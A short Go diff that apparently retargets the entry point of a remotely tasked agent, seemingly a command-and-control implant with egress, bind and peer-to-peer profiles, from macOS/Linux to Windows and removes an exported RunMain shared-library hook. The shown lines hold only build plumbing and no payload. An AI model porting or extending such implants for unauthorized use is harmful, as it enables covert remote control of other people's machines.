@@ -1,10 +1,8 @@
-//go:build (darwin || linux) && !shared
+//go:build windows && !shared
 
 package main
 
 import (
-	"C"
-
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/profiles"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/tasks"
@@ -12,11 +10,6 @@ import (
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/p2p"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/runtimeMainThread"
 )
-
-//export RunMain
-func RunMain() {
-	main()
-}
 
 func main() {
 	// initialize egress and bind profiles - needs to send edges messages and alerts outside direct tasking
